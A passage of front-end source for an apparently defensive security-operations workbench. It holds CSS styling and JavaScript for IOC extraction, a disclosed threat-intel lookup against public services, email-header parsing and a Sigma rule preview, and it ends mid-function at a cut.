        font-size: 0.76rem;
        font-weight: 700;
        letter-spacing: 0.14em;
        text-transform: uppercase;
        color: #3b82f6;
        margin-bottom: 0.85rem;
      }
      [data-md-color-scheme="default"] .psv-eyebrow { color: #2563eb; }

      .psv-hero-h1 {
        font-size: clamp(2.4rem, 4.6vw, 3.75rem);
        font-weight: 800;
        line-height: 1.06;
        letter-spacing: -0.03em;
        margin: 0 0 1rem 0;
        color: #ffffff;
      }
      [data-md-color-scheme="default"] .psv-hero-h1 { color: #0f172a; }
      .psv-hero-h1 span { color: #3b82f6; }
      [data-md-color-scheme="default"] .psv-hero-h1 span { color: #2563eb; }

      .psv-hero-desc {
        color: #94a3b8;
        font-size: 1.02rem;
        line-height: 1.65;
        max-width: 580px;
        margin: 0 0 1.4rem 0;
      }
      [data-md-color-scheme="default"] .psv-hero-desc { color: #475569; }

      .psv-stats-bar {
        display: inline-grid;
        grid-template-columns: repeat(3, auto);
        border-radius: 10px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        background: rgba(11, 20, 38, 0.85);
        overflow: hidden;
      }
      [data-md-color-scheme="default"] .psv-stats-bar {
        background: #ffffff;
        border-color: #cbd5e1;
      }
      .psv-stat-cell {
        padding: 0.75rem 1.35rem;
        border-right: 1px solid rgba(59, 130, 246, 0.18);
      }
      .psv-stat-cell:last-child { border-right: none; }
      .psv-stat-val {
        font-size: 1.35rem;
        font-weight: 800;
        color: #3b82f6;
        line-height: 1.1;
      }
      [data-md-color-scheme="default"] .psv-stat-val { color: #2563eb; }
      .psv-stat-lbl {
        font-size: 0.7rem;
        text-transform: uppercase;
        letter-spacing: 0.08em;
        color: #94a3b8;
        margin-top: 0.2rem;
      }

      .psv-preview-box {
        border-radius: 12px;
        border: 1px solid rgba(59, 130, 246, 0.28);
        background: linear-gradient(180deg, rgba(13, 23, 44, 0.9), rgba(7, 13, 26, 0.95));
        padding: 1rem;
        box-shadow: 0 16px 40px rgba(0, 0, 0, 0.45);
      }
      [data-md-color-scheme="default"] .psv-preview-box {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 8px 24px rgba(15, 23, 42, 0.06);
      }
      .psv-preview-top {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 0.72rem;
        color: #60a5fa;
        margin-bottom: 0.75rem;
        padding-bottom: 0.5rem;
        border-bottom: 1px solid rgba(59, 130, 246, 0.18);
      }
      [data-md-color-scheme="default"] .psv-preview-top { color: #2563eb; }
      .psv-preview-mini-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 0.5rem;
      }
      .psv-mini-tile {
        padding: 0.55rem 0.65rem;
        border-radius: 7px;
        border: 1px solid rgba(59, 130, 246, 0.2);
        background: rgba(6, 11, 22, 0.75);
        font-size: 0.73rem;
        font-weight: 600;
        color: #cbd5e1;
        cursor: pointer;
        text-align: left;
        transition: all 0.15s ease;
      }
      [data-md-color-scheme="default"] .psv-mini-tile {
        background: #f8fafc;
        color: #1e293b;
        border-color: #cbd5e1;
      }
      .psv-mini-tile:hover {
        border-color: #3b82f6;
        color: #3b82f6;
        transform: translateY(-1px);
      }
      .psv-mini-tile span {
        display: block;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 0.65rem;
        color: #3b82f6;
        margin-bottom: 0.15rem;
        pointer-events: none;
      }

      .psv-catalog-window {
        border-radius: 14px;
        border: 1px solid rgba(59, 130, 246, 0.35);
        background: #080e1c;
        overflow: hidden;
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.55);
      }
      [data-md-color-scheme="default"] .psv-catalog-window {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 10px 30px rgba(15, 23, 42, 0.06);
      }

      .psv-window-bar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 0.65rem 1.25rem;
        background: linear-gradient(90deg, #1d4ed8, #2563eb);
        color: #ffffff;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 0.76rem;
        font-weight: 700;
        letter-spacing: 0.06em;
      }
      .psv-window-dots {
        display: flex;
        align-items: center;
        gap: 0.4rem;
      }
      .psv-dot {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        background: rgba(255, 255, 255, 0.75);
      }

      .psv-catalog-body { padding: 1.5rem; }

      .psv-search-bar {
        width: 100%;
        padding: 0.8rem 1.1rem;
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.3);
        background: #050914;
        color: #f8fafc;
        font-size: 0.9rem;
        margin-bottom: 1rem;
        outline: none;
      }
      [data-md-color-scheme="default"] .psv-search-bar {
        background: #f8fafc;
        border-color: #cbd5e1;
        color: #0f172a;
      }
      .psv-search-bar:focus {
        border-color: #3b82f6;
        box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.25);
      }

      .psv-cat-pills {
        display: flex;
        flex-wrap: wrap;
        gap: 0.5rem;
        margin-bottom: 1.4rem;
      }
      .psv-pill {
        padding: 0.42rem 0.9rem;
        border-radius: 999px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        background: rgba(15, 23, 42, 0.8);
        color: #cbd5e1;
        font-size: 0.78rem;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.15s ease;
      }
      [data-md-color-scheme="default"] .psv-pill {
        background: #f1f5f9;
        border-color: #cbd5e1;
        color: #334155;
      }
      .psv-pill.active, .psv-pill:hover {
        background: #2563eb;
        border-color: #3b82f6;
        color: #ffffff !important;
      }

      .psv-cards-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 1.1rem;
      }
      @media (max-width: 1060px) { .psv-cards-grid { grid-template-columns: repeat(2, 1fr); } }
      @media (max-width: 680px) { .psv-cards-grid { grid-template-columns: 1fr; } }

      .psv-tool-card {
        border-radius: 11px;
        border: 1px solid rgba(59, 130, 246, 0.22);
        background: linear-gradient(180deg, rgba(13, 22, 42, 0.92), rgba(8, 14, 28, 0.96));
        padding: 1.25rem;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        cursor: pointer;
        transition: all 0.18s ease;
        text-align: left;
      }
      [data-md-color-scheme="default"] .psv-tool-card {
        background: #ffffff;
        border-color: #cbd5e1;
      }
      .psv-tool-card:hover {
        border-color: #3b82f6;
        transform: translateY(-2px);
        box-shadow: 0 10px 26px rgba(37, 99, 235, 0.22);
      }

      .psv-card-head {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 0.85rem;
      }
      .psv-card-badge {
        padding: 0.35rem 0.65rem;
        border-radius: 8px;
        background: linear-gradient(135deg, #2563eb, #1d4ed8);
        color: #ffffff;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 0.73rem;
        font-weight: 800;
        letter-spacing: 0.05em;
      }
      .psv-card-cat-lbl {
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 0.68rem;
        text-transform: uppercase;
        color: #64748b;
      }
      .psv-card-title {
        font-size: 1.05rem;
        font-weight: 700;
        color: #ffffff;
        margin: 0 0 0.4rem 0;
      }
      [data-md-color-scheme="default"] .psv-card-title { color: #0f172a; }
      .psv-card-desc {
        font-size: 0.81rem;
        color: #94a3b8;
        line-height: 1.5;
        margin: 0 0 1rem 0;
      }
      [data-md-color-scheme="default"] .psv-card-desc { color: #475569; }

      .psv-card-foot {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding-top: 0.75rem;
        border-top: 1px solid rgba(148, 163, 184, 0.12);
        font-size: 0.74rem;
      }
      .psv-client-tag { color: #10b981; font-weight: 600; }
      .psv-open-link { color: #60a5fa; font-weight: 700; }
      [data-md-color-scheme="default"] .psv-open-link { color: #2563eb; }

      /* === VIEW 2: DEDICATED SINGLE-TOOL PAGE === */
      .psv-tool-page { max-width: 960px; margin: 0 auto; }
      .psv-back-bar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        flex-wrap: wrap;
        gap: 0.75rem;
        margin-bottom: 1.5rem;
      }
      .psv-back-btn {
        display: inline-flex;
        align-items: center;
        gap: 0.45rem;
        padding: 0.5rem 1rem;
        border-radius: 8px;
        border: 1px solid rgba(59, 130, 246, 0.35);
        background: rgba(15, 23, 42, 0.85);
        color: #60a5fa;
        font-size: 0.82rem;
        font-weight: 700;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-back-btn {
        background: #ffffff;
        color: #2563eb;
        border-color: #cbd5e1;
      }

      .psv-tool-hero { text-align: center; margin-bottom: 1.85rem; }
      .psv-tool-hero-icon {
        width: 54px;
        height: 54px;
        margin: 0 auto 0.9rem auto;
        border-radius: 13px;
        background: linear-gradient(135deg, #2563eb, #1d4ed8);
        color: #ffffff;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 1rem;
        font-weight: 800;
        box-shadow: 0 8px 24px rgba(37, 99, 235, 0.4);
      }
      .psv-tool-hero h1 {
        font-size: clamp(1.85rem, 3.5vw, 2.5rem);
        font-weight: 800;
        margin: 0 0 0.5rem 0;
        color: #ffffff;
      }
      [data-md-color-scheme="default"] .psv-tool-hero h1 { color: #0f172a; }
      .psv-tool-hero p {
        color: #94a3b8;
        font-size: 0.96rem;
        max-width: 650px;
        margin: 0 auto 0.9rem auto;
      }
      [data-md-color-scheme="default"] .psv-tool-hero p { color: #475569; }
      .psv-hero-badges {
        display: flex;
        justify-content: center;
        gap: 0.6rem;
        flex-wrap: wrap;
      }
      .psv-pill-badge {
        padding: 0.28rem 0.75rem;
        border-radius: 999px;
        font-size: 0.73rem;
        font-weight: 700;
        border: 1px solid rgba(59, 130, 246, 0.35);
        background: rgba(37, 99, 235, 0.12);
        color: #60a5fa;
      }
      [data-md-color-scheme="default"] .psv-pill-badge { color: #1d4ed8; background: #eff6ff; }

      .psv-terminal-box {
        border-radius: 13px;
        border: 1px solid rgba(59, 130, 246, 0.4);
        background: #080e1c;
        overflow: hidden;
        box-shadow: 0 18px 45px rgba(0, 0, 0, 0.5);
        margin-bottom: 2.75rem;
      }
      [data-md-color-scheme="default"] .psv-terminal-box {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 10px 28px rgba(15, 23, 42, 0.07);
      }
      .psv-term-body { padding: 1.4rem; }
      .psv-privacy-strip {
        padding: 0.6rem 0.9rem;
        border-radius: 8px;
        border: 1px solid rgba(16, 185, 129, 0.3);
        background: rgba(16, 185, 129, 0.08);
        color: #34d399;
        font-size: 0.79rem;
        margin-bottom: 1.15rem;
      }
      [data-md-color-scheme="default"] .psv-privacy-strip { color: #047857; background: #ecfdf5; }

      .psv-field-label {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 0.74rem;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 0.07em;
        color: #94a3b8;
        margin-bottom: 0.45rem;
      }
      .psv-editor {
        width: 100%;
        min-height: 155px;
        padding: 0.9rem;
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.28);
        background: #040811;
        color: #f1f5f9;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 0.83rem;
        line-height: 1.5;
        margin-bottom: 1rem;
        resize: vertical;
      }
      [data-md-color-scheme="default"] .psv-editor {
        background: #f8fafc;
        border-color: #cbd5e1;
        color: #0f172a;
      }

      .psv-action-bar {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        justify-content: space-between;
        gap: 0.75rem;
        margin-bottom: 1.2rem;
      }
      .psv-opt-group { display: flex; flex-wrap: wrap; gap: 0.45rem; }
      .psv-opt-pill {
        padding: 0.4rem 0.85rem;
        border-radius: 999px;
        border: 1px solid rgba(59, 130, 246, 0.3);
        background: transparent;
        color: #cbd5e1;
        font-size: 0.76rem;
        font-weight: 600;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-opt-pill { color: #334155; border-color: #cbd5e1; }
      .psv-opt-pill.active {
        background: #2563eb;
        border-color: #3b82f6;
        color: #ffffff !important;
      }

      .psv-btn-group { display: flex; flex-wrap: wrap; gap: 0.5rem; }
      .psv-btn-run {
        padding: 0.55rem 1.2rem;
        border-radius: 8px;
        border: none;
        background: linear-gradient(135deg, #2563eb, #1d4ed8);
        color: #ffffff !important;
        font-size: 0.83rem;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
      }
      .psv-btn-util {
        padding: 0.52rem 0.9rem;
        border-radius: 8px;
        border: 1px solid rgba(148, 163, 184, 0.25);
        background: rgba(15, 23, 42, 0.8);
        color: #cbd5e1;
        font-size: 0.79rem;
        font-weight: 600;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-btn-util {
        background: #f1f5f9;
        color: #334155;
        border-color: #cbd5e1;
      }

      .psv-output-container {
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        background: #040811;
        padding: 1rem;
        overflow-x: auto;
      }
      [data-md-color-scheme="default"] .psv-output-container {
        background: #f8fafc;
        border-color: #cbd5e1;
      }

      .psv-out-table {
        width: 100%;
        border-collapse: collapse;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
        font-size: 0.79rem;
      }
      .psv-out-table th {
        text-align: left;
        padding: 0.55rem 0.7rem;
        color: #60a5fa;
        border-bottom: 1px solid rgba(59, 130, 246, 0.25);
        font-weight: 700;
      }
      [data-md-color-scheme="default"] .psv-out-table th { color: #1d4ed8; border-bottom-color: #cbd5e1; }
      .psv-out-table td {
        padding: 0.52rem 0.7rem;
        border-bottom: 1px solid rgba(148, 163, 184, 0.1);
        color: #e2e8f0;
        word-break: break-word;
      }
      [data-md-color-scheme="default"] .psv-out-table td { color: #1e293b; border-bottom-color: #e2e8f0; }

      .psv-doc-section { margin-bottom: 1.75rem; }
      .psv-doc-section h3 {
        font-size: 1.1rem;
        font-weight: 700;
        color: #ffffff;
        margin: 0 0 0.45rem 0;
      }
      [data-md-color-scheme="default"] .psv-doc-section h3 { color: #0f172a; }
      .psv-doc-section p, .psv-doc-section li {
        font-size: 0.9rem;
        color: #94a3b8;
        line-height: 1.65;
      }
      [data-md-color-scheme="default"] .psv-doc-section p, [data-md-color-scheme="default"] .psv-doc-section li { color: #475569; }

      .psv-faq-item {
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.22);
        background: rgba(11, 20, 38, 0.75);
        margin-bottom: 0.6rem;
        padding: 0.85rem 1.1rem;
      }
      [data-md-color-scheme="default"] .psv-faq-item { background: #ffffff; border-color: #cbd5e1; }
      .psv-faq-item summary {
        font-weight: 700;
        font-size: 0.9rem;
        cursor: pointer;
        color: #e2e8f0;
      }
      [data-md-color-scheme="default"] .psv-faq-item summary { color: #0f172a; }
      .psv-faq-item p { margin: 0.6rem 0 0 0; font-size: 0.85rem; color: #94a3b8; }

      .psv-related-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 0.85rem;
        margin-top: 0.85rem;
      }
      @media (max-width: 800px) { .psv-related-grid { grid-template-columns: repeat(2, 1fr); } }
    `;
    document.head.appendChild(style);
  }

  function applyPresetOption(tool, idx) {
    if (tool.id === "ti") {
      userInputs.ti = ["1.1.1.1", "8.8.8.8", "example.com"][idx] || "1.1.1.1";
    } else if (tool.id === "sigma" && SIGMA_TEMPLATES[idx]) {
      userInputs.sigma = SIGMA_TEMPLATES[idx].yaml;
    } else if (tool.id === "regex") {
      userInputs.regex = idx === 1
        ? `PATTERN::CEF:0\\|(?<vendor>[^|]+)\\|(?<product>[^|]+)\\|[^|]+\\|(?< signature_id>\\d+)\\|(?<event_name>[^|]+)\\|(?<severity>\\d+)\\|src=(?<src_ip>\\S+)\\s+dst=(?<dst_ip>\\S+)\nLOG::CEF:0|PaloAlto|PAN-OS|10.2|40012|Brute-Force-Login|9|src=185.220.101.42 dst=10.40.1.15\nCEF:0|PaloAlto|PAN-OS|10.2|40019|SQL-Injection-Attempt|10|src=91.240.118.22 dst=10.40.2.80`
        : tool.sample;
    } else if (tool.id === "timestamp") {
      if (idx === 0) userInputs.timestamp = "1760713462";
      if (idx === 1) userInputs.timestamp = "134051966620000000";
      if (idx === 2) userInputs.timestamp = String(Math.floor(Date.now() / 1000));
    } else if (tool.id === "severity") {
      userInputs.severity = idx === 1
        ? `ASSET_CRITICALITY::workstation\nDATA_SENSITIVITY::internal\nCOMPROMISE_SCOPE::single_host\nTHREAT_STATUS::contained\nPRIVILEGE_LEVEL::standard_user`
        : tool.sample;
    } else if (tool.id === "cvss") {
      userInputs.cvss = [
        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:M",
        "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
        "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:U/RL:O/RC:C"
      ][idx] || tool.sample;
    }
  }

  let tiLookupSequence = 0;

  function normalizeThreatIndicator(raw) {
    let value = String(raw || "").trim();
    if (!value || /\s/.test(value)) return null;
    value = value.replace(/^hxxps?:\/\//i, "https://").replace(/\[\.\]/g, ".");
    if (/^https?:\/\//i.test(value)) {
      try { value = new URL(value).hostname; } catch (err) { return null; }
    } else {
      value = value.split(/[/?#]/, 1)[0];
    }
    value = value.replace(/^\[|\]$/g, "").replace(/\.$/, "").toLowerCase();
    const octets = value.split(".");
    const isIPv4 = octets.length === 4 && octets.every(part => /^(0|[1-9]\d{0,2})$/.test(part) && Number(part) <= 255);
    if (isIPv4) {
      const [a, b] = octets.map(Number);
      const privateOrSpecial =
        a === 0 || a === 10 || a === 127 || a >= 224 ||
        (a === 100 && b >= 64 && b <= 127) ||
        (a === 169 && b === 254) ||
        (a === 172 && b >= 16 && b <= 31) ||
        (a === 192 && b === 168) ||
        (a === 192 && b === 0 && Number(octets[2]) === 0) ||
        (a === 192 && b === 0 && Number(octets[2]) === 2) ||
        (a === 192 && b === 88 && Number(octets[2]) === 99) ||
        (a === 198 && (b === 18 || b === 19)) ||
        (a === 198 && b === 51 && Number(octets[2]) === 100) ||
        (a === 203 && b === 0 && Number(octets[2]) === 113);
      if (privateOrSpecial) return null;
      return { value, isIp: true };
    }
    if (/^\d{1,3}(?:\.\d{1,3}){3}$/.test(value)) return null;
    if (value.length > 253 || value.length < 4 || !value.includes(".")) return null;
    const labels = value.split(".");
    if (["example.com", "example.net", "example.org"].some(domain => value === domain || value.endsWith("." + domain))) return null;
    if (!labels.every(label => label.length <= 63 && /^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/.test(label)) ||
        !/[a-z]/.test(labels[labels.length - 1])) return null;
    if (["localhost", "local", "internal", "test", "invalid", "example", "onion"].includes(labels[labels.length - 1])) return null;
    return { value, isIp: false };
  }

  async function fetchThreatJson(url, options) {
    const response = await fetch(url, options);
    if (response.status === 404) return { notFound: true, data: null };
    if (!response.ok) throw new Error("HTTP " + response.status);
    return { notFound: false, data: await response.json() };
  }

  async function runThreatIntelLookup(rawInput, outputElement) {
    const parsed = normalizeThreatIndicator(rawInput);
    if (!parsed) {
      outputElement.innerHTML = '<div role="alert" class="psv-ti-error">Invalid input. Enter one public IPv4 address or a valid domain name. URLs are accepted, but only their hostname is queried.</div>';
      return;
    }
    const requestId = ++tiLookupSequence;
    const indicator = parsed.value;
    outputElement.innerHTML = '<div role="status">Sending the requested indicator to the disclosed public services…</div>';
    const jobs = [];
    if (parsed.isIp) jobs.push(["Shodan InternetDB", fetchThreatJson("https://internetdb.shodan.io/" + encodeURIComponent(indicator))]);
    jobs.push(["RDAP", fetchThreatJson("https://rdap.org/" + (parsed.isIp ? "ip/" : "domain/") + encodeURIComponent(indicator), { headers: { accept: "application/rdap+json, application/json" } })]);
    if (!parsed.isIp) jobs.push(["Cloudflare DNS", fetchThreatJson("https://cloudflare-dns.com/dns-query?name=" + encodeURIComponent(indicator) + "&type=A", { headers: { accept: "application/dns-json" } })]);
    const settled = await Promise.allSettled(jobs.map(job => job[1]));
    if (requestId !== tiLookupSequence || document.getElementById("psv-tool-result-box") !== outputElement || activeToolId !== "ti" || currentView !== "tool") return;
    const results = {};
    jobs.forEach((job, index) => {
      const result = settled[index];
      results[job[0]] = result.status === "fulfilled"
        ? { ok: true, ...result.value }
        : { ok: false, error: result.reason && result.reason.message ? result.reason.message : "Request failed" };
    });
    const cell = name => {
      const r = results[name];
      if (!r) return "Not applicable";
      if (!r.ok) return '<span class="psv-ti-error">Lookup failed: ' + esc(r.error) + '</span>';
      if (r.notFound) return "No record returned by provider (HTTP 404).";
      const d = r.data || {};
      if (name === "Shodan InternetDB") return "Open ports: " + esc((d.ports || []).join(", ") || "None listed") + "<br>Hostnames: " + esc((d.hostnames || []).join(", ") || "None listed") + "<br>CVEs: " + esc((d.vulns || []).join(", ") || "None listed");
      if (name === "RDAP") return "Name/handle: " + esc(d.ldhName || d.handle || indicator) + "<br>Status: " + esc(Array.isArray(d.status) ? d.status.join(", ") : "Not supplied") + "<br>Country: " + esc(d.country || "Not supplied");
      const answers = Array.isArray(d.Answer) ? d.Answer : [];
      return answers.length ? answers.map(a => esc(a.name) + " → " + esc(a.data) + " (TTL " + esc(a.TTL) + ")").join("<br>") : "No A-record answer returned (DNS status: " + esc(d.Status) + ").";
    };
    const pivot = encodeURIComponent(indicator);
    outputElement.innerHTML = `
      <div role="status"><strong>Lookup completed.</strong> Provider responses are not a verdict that an indicator is malicious or benign.</div>
      <table class="psv-out-table"><thead><tr><th>Service</th><th>Indicator</th><th>Provider response</th></tr></thead><tbody>
        ${parsed.isIp ? '<tr><td>Shodan InternetDB</td><td>' + esc(indicator) + '</td><td>' + cell("Shodan InternetDB") + '</td></tr>' : ''}
        <tr><td>RDAP</td><td>${esc(indicator)}</td><td>${cell("RDAP")}</td></tr>
        ${!parsed.isIp ? '<tr><td>Cloudflare DNS (A)</td><td>' + esc(indicator) + '</td><td>' + cell("Cloudflare DNS") + '</td></tr>' : ''}
      </tbody></table>
      <p>Optional external pivots (opening a link also shares the indicator with that provider):
        <a href="https://www.virustotal.com/gui/search/${pivot}" target="_blank" rel="noopener noreferrer">VirusTotal</a> ·
        <a href="https://www.abuseipdb.com/check/${pivot}" target="_blank" rel="noopener noreferrer">AbuseIPDB</a> ·
        <a href="https://urlscan.io/search/#${pivot}" target="_blank" rel="noopener noreferrer">URLScan</a> ·
        <a href="https://www.shodan.io/search?query=${pivot}" target="_blank" rel="noopener noreferrer">Shodan</a>
      </p>`;
  }

  function computeDynamicOutput(tool, rawInput) {
    const input = (rawInput || "").trim();
    if (!input) {
      return `<div style="color:#94a3b8;padding:0.5rem;">Input is empty. Click <strong>Load Sample</strong> above or paste your own telemetry.</div>`;
    }

    if (tool.id === "ioc") {
      const raw = selectedOptionIdx === 1;
      const fmt = v => raw ? v : defang(v);
      const unique = a => Array.from(new Set(a));
      const validIPv4 = v => { const p=v.split("."); return p.length===4 && p.every(x=>/^(0|[1-9]\d{0,2})$/.test(x)&&Number(x)<=255); };
      const urls = unique((input.match(/https?:\/\/[^\s"'<>]+/gi)||[]).map(v=>v.replace(/[),.;!?}\]]+$/g,"")));
      const emails = unique(input.match(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g)||[]);
      const ips = unique(input.match(/(?<![\w.])(?:\d{1,3}\.){3}\d{1,3}(?![\w.])/g)||[]).filter(validIPv4);
      const hosts = urls.map(v=>{try{return new URL(v).hostname.toLowerCase().replace(/^\[|\]$/g,"")}catch(e){return ""}}).filter(Boolean);
      const mailDomains = emails.map(v=>v.split("@").pop().toLowerCase());
      const domains = unique([...hosts,...mailDomains,...(input.match(/(?<![A-Za-z0-9_-])(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,63}(?![A-Za-z0-9_-])/g)||[])].map(v=>v.toLowerCase())).filter(v=>!validIPv4(v)&&!v.includes(":"));
      const hashes = unique([...(input.match(/(?<![A-Fa-f0-9])[A-Fa-f0-9]{32}(?![A-Fa-f0-9])/g)||[]).map(v=>v+"|MD5"),...(input.match(/(?<![A-Fa-f0-9])[A-Fa-f0-9]{40}(?![A-Fa-f0-9])/g)||[]).map(v=>v+"|SHA-1"),...(input.match(/(?<![A-Fa-f0-9])[A-Fa-f0-9]{64}(?![A-Fa-f0-9])/g)||[]).map(v=>v+"|SHA-256")]).map(v=>v.split("|"));
      const cves=unique(input.match(/\bCVE-\d{4}-\d{4,7}\b/gi)||[]).map(v=>v.toUpperCase());
      const rows=[...ips.map(v=>["IPv4 Address",v,fmt(v),true]),...urls.map(v=>["URL",v,fmt(v),false]),...domains.map(v=>["Domain",v,fmt(v),true]),...emails.map(v=>["Email Address",v,fmt(v),false]),...hashes.map(([v,t])=>[t+" Hash",v,v,false]),...cves.map(v=>["CVE Vulnerability",v,v,false])];
      if(!rows.length)return '<div role="status">No supported indicators matched. IPv4 must contain four decimal octets in the range 0–255; hashes must be exactly 32, 40, or 64 hexadecimal characters.</div>';
      return '<table class="psv-out-table"><thead><tr><th>#</th><th>Type</th><th>Original</th><th>'+(raw?"Extracted":"Safe Defanged Output")+'</th><th>Quick Pivot</th></tr></thead><tbody>'+
        rows.map((r,i)=>'<tr><td>'+(i+1)+'</td><td>'+esc(r[0])+'</td><td>'+esc(r[1])+'</td><td>'+esc(r[2])+'</td><td>'+(r[3]?'<button type="button" class="psv-btn-util" data-psv-action="pivot-ti" data-indicator="'+esc(r[1])+'">Enrich →</button>':'—')+'</td></tr>').join("")+
        '</tbody></table><p class="psv-tool-note">Domain extraction includes URL hostnames, email domains, and domain-like text. It is pattern-based, not DNS validation. IPv4 is syntax-checked only; private/reserved ranges are not classified here.</p>';
    }

    if (tool.id === "ti") {
      const target = normalizeThreatIndicator(input);
      if (!target) return '<div role="status">Enter one public IPv4 address or fully qualified domain name. No request is made while typing.</div>';
      return `
        <div role="note" class="psv-ti-disclosure"><strong>External lookup notice:</strong> Selecting <strong>Enrich Indicator</strong> sends this indicator to Shodan InternetDB (IPv4 only), RDAP, and Cloudflare DNS (domains only). These are third-party services. Do not submit internal, customer, confidential, or employer-sensitive indicators.</div>
        <div role="status"><strong>Ready — no request has been sent.</strong><br>Indicator: <code>${esc(target.value)}</code><br>Select <strong>Enrich Indicator</strong> to make the external requests.</div>
      `;
    }

    if (tool.id === "headers") {
      const getHeader = name => (input.match(new RegExp("^" + name + ":\\s*(.+)$", "im")) || [])[1] || "Not present";
      const from=getHeader("From"), replyTo=getHeader("Reply-To"), returnPath=getHeader("Return-Path"), origIp=getHeader("X-Originating-IP");
      const authHeaders=input.match(/^Authentication-Results:[^\r\n]*(?:\r?\n[ \t]+[^\r\n]*)*/gim)||[];
      const authText=authHeaders.join(" | ");
      const readResult=key=>{const m=authText.match(new RegExp("(?:^|[;\\s])"+key+"=([A-Za-z0-9_-]+)","i"));return m?m[1].toUpperCase():"Not reported";};
      const spf=readResult("spf"),dkim=readResult("dkim"),dmarc=readResult("dmarc");
      const hops=(input.match(/^Received:[^\r\n]*(?:\r?\n[ \t]+[^\r\n]*)*/gim)||[]).reverse();
      const domain=value=>{const m=String(value).match(/@([A-Za-z0-9.-]+\.[A-Za-z]{2,})/);return m?m[1].toLowerCase():"";};
      const fd=domain(from),rd=domain(replyTo),diff=Boolean(fd&&rd&&fd!==rd);
      return '<div role="note" class="psv-tool-note"><strong>Important limitation:</strong> Text parser only. It does not cryptographically verify DKIM, SPF, or DMARC, and cannot establish whether Authentication-Results or Received headers were added by a trusted mail server. Validate the trusted gateway boundary using the original message and mail-platform logs.</div>'+
      '<table class="psv-out-table"><thead><tr><th>Header / Hop</th><th>Parsed Value</th><th>Interpretation</th></tr></thead><tbody>'+
      '<tr><td>From</td><td>'+esc(from)+'</td><td>Supplied header; not proof of sender identity</td></tr>'+
      '<tr><td>Reply-To</td><td>'+esc(replyTo)+'</td><td>'+(diff?"Reply-To domain differs from From domain":"No domain difference established")+'</td></tr>'+
      '<tr><td>Return-Path</td><td>'+esc(returnPath)+'</td><td>Supplied envelope-return header</td></tr>'+
      '<tr><td>X-Originating-IP</td><td>'+esc(origIp)+'</td><td>Unverified header value; corroborate independently</td></tr>'+
      '<tr><td>Reported SPF</td><td>'+esc(spf)+'</td><td>Text parsed from supplied Authentication-Results</td></tr>'+
      '<tr><td>Reported DKIM</td><td>'+esc(dkim)+'</td><td>Text parsed; signature not verified</td></tr>'+
      '<tr><td>Reported DMARC</td><td>'+esc(dmarc)+'</td><td>Text parsed from supplied Authentication-Results</td></tr>'+
      authHeaders.map((h,i)=>'<tr><td>Authentication-Results #'+(i+1)+'</td><td colspan="2">'+esc(h.replace(/\s+/g," ").trim())+'</td></tr>').join("")+
      hops.map((h,i)=>'<tr><td><strong>Received hop #'+(i+1)+'</strong></td><td colspan="2">'+esc(h.replace(/\s+/g," ").trim())+'</td></tr>').join("")+
      '</tbody></table>';
    }

    if (tool.id === "sigma") {
      return `
        <div role="note"><strong>Preview only — no SIEM query was generated.</strong><br>This workbench does not include a standards-compliant Sigma YAML parser or conversion backend. The text below is displayed as supplied; it has not been syntax-checked or semantically validated.</div>
        <pre style="white-space:pre-wrap;overflow-wrap:anywhere;">${esc(input)}</pre>
        <p>For production conversion, use maintained Sigma tooling and validate the resulting query against your target SIEM schema and telemetry.</p>
      `;
    }

    if (tool.id === "events") {
      const q = input.toLowerCase().trim();
      const filtered = EVENT_DB.filter(e => {
        if (selectedOptionIdx === 1 && e.source !== "Windows Security") return false;
        if (selectedOptionIdx === 2 && e.source !== "Sysmon") return false;
